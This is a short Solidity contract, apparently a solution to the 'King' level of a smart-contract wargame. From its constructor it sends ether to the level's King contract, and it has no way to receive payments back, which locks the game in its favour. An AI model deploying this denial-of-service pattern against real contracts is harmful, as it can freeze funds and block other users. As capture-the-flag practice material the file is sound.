// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { King } from "./Level09.sol";

contract L09Attack {
    constructor(King instance) payable {
        (bool success,) = payable(address(instance)).call{ value: msg.value }("");
        require(success, "call failed");
    }
}
